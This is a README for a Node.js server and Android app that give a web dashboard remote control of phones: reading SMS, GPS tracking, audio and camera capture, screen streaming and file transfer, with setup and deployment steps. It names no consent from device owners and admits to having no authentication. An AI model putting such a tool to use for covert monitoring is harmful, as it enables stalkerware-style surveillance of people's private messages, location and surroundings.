# 🖥️ Remote System Control Server

A comprehensive Node.js + Socket.IO server that bridges real-time communication between the Remote System Control Android app and web clients for advanced device management and control.

## 🚀 Key Features

- **🔗 Real-time Communication** - WebSocket-based bidirectional communication using Socket.IO
- **📱 Multi-Device Management** - Handle multiple Android devices simultaneously
- **🌐 Web Dashboard** - Modern Bootstrap-based web interface for device control
- **📁 File Transfer System** - Upload/download files between devices and server (50MB limit)
- **📺 Live Streaming** - Real-time video, audio, and screen streaming capabilities
- **⚡ Command Routing** - Efficient command routing between web clients and Android devices
- **📊 Device Monitoring** - Real-time device status and connection monitoring
- **🔒 Session Management** - Secure device registration and client management

## 📋 Prerequisites

- **Node.js** 16+ installed ([Download here](https://nodejs.org/))
- **npm** package manager (comes with Node.js)
- **Git** for version control

## 🛠️ Quick Start

### 1. Clone and Setup

```bash
# Clone the repository
git clone <your-repo-url>
cd Remote-System-Server

# Install dependencies
npm install
```

### 2. Start the Server

```bash
# Start in production mode
npm start

# Or start with auto-restart for development
npm run dev
```

**✅ Server will start on:** `http://localhost:3000`

### 3. Access Web Dashboard

Open your browser and navigate to: **`http://localhost:3000`**

## 📱 Android App Configuration

### **🔧 Update Server URL in Android App**

To connect your Android app to this server, you need to update the server URL in the following file:

**📁 File Location:** `/Remote-System-APK/app/src/main/java/com/remote/system/RemoteControlService.kt`

**🔍 Find this line (around line 30-40):**
```kotlin
private val serverUrl = "ws://10.0.2.2:3000" // Current URL
```

**✏️ Replace with your server URL:**

#### For Local Development:
```kotlin
private val serverUrl = "ws://localhost:3000"
```

#### For Network Access (LAN):
```kotlin
private val serverUrl = "ws://YOUR_SERVER_IP:3000"
// Example: private val serverUrl = "ws://192.168.1.100:3000"
```

#### For Production Deployment:
```kotlin
private val serverUrl = "ws://your-domain.com:3000"
// Or if using HTTPS/WSS: private val serverUrl = "wss://your-domain.com"
```

### **📱 Find Your Server IP Address**

```bash
# On Linux/Mac
hostname -I

# On Windows
ipconfig

# Or use the server startup log - it shows your IP
```

### **🔨 Rebuild Android App After URL Change**

```bash
cd /workspaces/Remote-System-APK
./gradlew assembleDebug
```

## 🌐 Web Dashboard Features

### **📊 Device Management**
- View all connected Android devices in real-time
- Monitor device status (online/offline)
- Display device information (name, model, Android version, IP)

### **🎮 Remote Control Commands**
- **📱 Device Info** - Get comprehensive device details
- **💬 SMS Manager** - Read and manage SMS messages
- **📁 File Manager** - Complete file system operations
  - Browse directories
  - Upload/download files
  - Create/delete folders
  - Rename files and folders
- **📷 Camera Control** - Photo capture and live video streaming
- **🖥️ Screen Capture** - Screenshots and real-time screen streaming
- **🎵 Audio Recording** - Audio capture and streaming
- **📍 GPS Location** - Real-time location tracking

### **📺 Live Streaming Features**
- Real-time screen mirroring
- Live camera video streaming
- Audio streaming with quality controls
- Configurable FPS and quality settings

## 🔧 API Documentation

### **REST API Endpoints**

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/status` | Server status and statistics |
| `GET` | `/api/devices` | List of connected devices |
| `POST` | `/api/upload` | File upload endpoint |
| `GET` | `/uploads/:filename` | File download endpoint |

### **Socket.IO Events**

#### **📤 Client to Server Events**
```javascript
// Device Registration (Android App)
socket.emit('register-device', {
    deviceId: 'unique-device-id',
    name: 'Device Name',
    model: 'Device Model',
    androidVersion: 'Android 13',
    ipAddress: '192.168.1.100',
    capabilities: ['sms', 'camera', 'files', 'screen', 'audio']
});

// Web Client Registration
socket.emit('register-client', {
    name: 'Web Client'
});

// Send Command to Device
socket.emit('send-command', {
    deviceId: 'device-id',
    command: {
        command: 'get_device_info',
        parameters: {}
    }
});
```

#### **📥 Server to Client Events**
```javascript
// Device List Update
socket.on('device-list', (devices) => {
    // Handle device list
});

// Command Response
socket.on('command-response', (response) => {
    // Handle command response
});

// Live Stream Data
socket.on('stream-data', (data) => {
    // Handle streaming data
});
```

## 📂 Project Structure

```
Remote-System-Server/
├── 📄 server.js              # Main Express + Socket.IO server
├── 📄 package.json           # Dependencies and npm scripts
├── 📄 package-lock.json      # Locked dependency versions
├── 📄 README.md              # This documentation
├── 📁 public/                # Static web client files
│   ├── 📄 index.html         # Main dashboard interface
│   └── 📁 js/
│       └── 📄 app.js         # Client-side JavaScript
├── 📁 uploads/               # File upload storage directory
└── 📁 node_modules/          # Node.js dependencies
```

## ⚙️ Configuration Options

### **Environment Variables**

Create a `.env` file (optional):
```bash
PORT=3000                    # Server port
NODE_ENV=development         # Environment
MAX_FILE_SIZE=52428800      # 50MB in bytes
```

### **Server Configuration**

Edit `server.js` for advanced configuration:

```javascript
// CORS Configuration
const io = socketIo(server, {
    cors: {
        origin: "*",              // Change for production
        methods: ["GET", "POST"],
        credentials: true
    }
});

// File Upload Limits
const upload = multer({ 
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 } // 50MB limit
});
```

## 🚀 Deployment Options

### **1. Local Network Deployment**
```bash
# Start server on all network interfaces
npm start
# Access via: http://YOUR_SERVER_IP:3000
```

### **2. Cloud Deployment (Heroku)**
```bash
# Install Heroku CLI
npm install -g heroku

# Login and create app
heroku login
heroku create your-app-name

# Deploy
git push heroku main
```

### **3. VPS Deployment**
```bash
# On your VPS
git clone <your-repo>
cd Remote-System-Server
npm install
npm install -g pm2

# Start with PM2 for production
pm2 start server.js --name "remote-control-server"
pm2 startup
pm2 save
```

## 🔐 Security Considerations

**⚠️ Important Security Notes:**

### **For Development:**
- ✅ Current configuration is suitable for development/testing
- ✅ CORS allows all origins for easy testing

### **For Production:**
- 🔒 **Add Authentication:** Implement user authentication for web clients
- 🔒 **Device Verification:** Add device token/certificate verification
- 🔒 **Use HTTPS/WSS:** Enable SSL encryption for all connections
- 🔒 **Rate Limiting:** Add request rate limiting to prevent abuse
- 🔒 **Input Validation:** Validate and sanitize all inputs
- 🔒 **CORS Restriction:** Limit CORS to specific domains

### **Security Implementation Example:**
```javascript
// Add to server.js for production
const rateLimit = require("express-rate-limit");

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/api/', limiter);
```

## 🔧 Android App Integration Details

### **Required Changes in Android App:**

1. **📁 Update Server URL:**
   - File: `RemoteControlService.kt`
   - Update the `serverUrl` variable

2. **🔌 Socket.IO Connection:**
```kotlin
import io.socket.client.IO
import io.socket.client.Socket

class RemoteControlService {
    private val serverUrl = "ws://YOUR_SERVER_IP:3000"
    private lateinit var socket: Socket
    
    private fun connectToServer() {
        socket = IO.socket(serverUrl)
        
        socket.on(Socket.EVENT_CONNECT) {
            registerDevice()
        }
        
        socket.on("remote-command") { args ->
            handleRemoteCommand(args[0] as JSONObject)
        }
        
        socket.connect()
    }
}
```

3. **📱 Device Registration:**
```kotlin
private fun registerDevice() {
    val deviceInfo = JSONObject().apply {
        put("deviceId", getDeviceId())
        put("name", Build.MODEL)
        put("model", Build.MODEL)
        put("androidVersion", Build.VERSION.RELEASE)
        put("ipAddress", getLocalIpAddress())
        put("capabilities", JSONArray(listOf("sms", "camera", "files", "screen", "audio")))
    }
    
    socket.emit("register-device", deviceInfo)
}
```

## 📊 Monitoring and Debugging

### **Server Logs**
```bash
# View real-time logs
tail -f logs/server.log

# Or if using PM2
pm2 logs remote-control-server
```

### **Connection Monitoring**
- 📊 Web dashboard shows real-time device connections
- 📊 Server console logs all connection events
- 📊 Use `/api/status` for health monitoring

### **Debug Mode**
```bash
# Start with debug logging
DEBUG=socket.io* npm start
```

## 🛠️ Troubleshooting Guide

### **❌ Common Issues and Solutions**

#### **1. Port Already in Use**
```bash
# Find process using port 3000
lsof -ti:3000

# Kill the process
lsof -ti:3000 | xargs kill -9

# Or use different port
PORT=3001 npm start
```

#### **2. Android App Can't Connect**
- ✅ Check server IP address is correct
- ✅ Ensure port 3000 is not blocked by firewall
- ✅ Verify Android app has INTERNET permission
- ✅ Check network connectivity between devices

#### **3. File Upload Issues**
```bash
# Check uploads directory permissions
chmod 755 uploads/

# Check disk space
df -h
```

#### **4. WebSocket Connection Fails**
- ✅ Check browser console for errors
- ✅ Verify Socket.IO versions compatibility
- ✅ Test with different browsers

### **🔍 Debug Commands**
```bash
# Check server status
curl http://localhost:3000/api/status

# Check connected devices
curl http://localhost:3000/api/devices

# Test WebSocket connection
# Use browser console:
# const socket = io('http://localhost:3000');
# socket.on('connect', () => console.log('Connected!'));
```

## 🏁 Quick Reference

### **Essential URLs**
- **Web Dashboard:** `http://localhost:3000`
- **API Status:** `http://localhost:3000/api/status`
- **Device List:** `http://localhost:3000/api/devices`

### **Socket.IO Connection**
- **Local:** `ws://localhost:3000`
- **Network:** `ws://YOUR_IP:3000`
- **Production:** `wss://your-domain.com`

### **Android App File to Update**
```
📁 /Remote-System-APK/app/src/main/java/com/remote/system/RemoteControlService.kt
🔍 Line ~35: private val serverUrl = "ws://YOUR_SERVER_IP:3000"
```

---

## 🎉 Success! Your Remote System Control Server is Ready

**✨ You now have a complete server solution that bridges Android devices and web clients for comprehensive remote device management!**

**🔥 Next Steps:**
1. ✅ Update Android app server URL
2. ✅ Build and install updated APK
3. ✅ Test device connection
4. ✅ Explore web dashboard features
5. ✅ Consider deployment for network access

**Happy Remote Controlling! 🚀📱💻**
